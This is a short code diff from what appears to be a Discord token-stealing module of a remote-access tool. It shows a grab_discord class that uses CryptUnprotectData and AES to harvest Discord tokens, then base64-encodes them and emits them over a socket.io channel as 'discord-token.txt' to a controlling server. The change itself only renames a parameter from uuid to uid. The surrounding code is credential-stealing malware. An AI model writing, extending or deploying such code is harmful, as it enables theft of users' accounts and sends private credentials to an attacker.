@@ -7,7 +7,7 @@ from Crypto.Cipher import AES
 from discord import Embed
 from win32crypt import CryptUnprotectData
 
-def run(sio, uuid):
+def run(sio, uid):
     class grab_discord():
         def initialize(raw_data):
             return fetch_tokens().upload(raw_data)
@@ -218,4 +218,4 @@ def run(sio, uuid):
         
     x = grab_discord().initialize()
     print(x)
-    sio.emit('download_file_return', {'uuid': uuid, 'file_name': "discord-token.txt", 'file': base64.b64encode(str(x).encode('utf-8'))})
+    sio.emit('download_file_return', {'uid': uid, 'file_name': "discord-token.txt", 'file': base64.b64encode(str(x).encode('utf-8'))})
